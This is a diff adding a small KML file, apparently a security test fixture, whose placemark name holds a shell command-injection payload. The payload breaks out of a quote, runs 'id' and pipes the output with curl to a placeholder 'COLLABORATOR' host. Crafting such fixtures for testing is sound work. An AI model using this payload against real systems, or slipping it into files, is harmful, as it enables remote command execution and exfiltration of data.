@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<kml>
+  <Document>
+    <Placemark>
+      <name>x'; id | curl --data-binary @-http://COLLABORATOR/id ; echo '</name>
+      <Polygon>
+        <outerBoundaryIs>
+          <LinearRing>
+            <coordinates>
+              -50,60
+              -50,61
+              -49,61
+              -49,60
+              -50,60
+            </coordinates>
+          </LinearRing>
+        </outerBoundaryIs>
+      </Polygon>
+    </Placemark>
+  </Document>
+</kml>
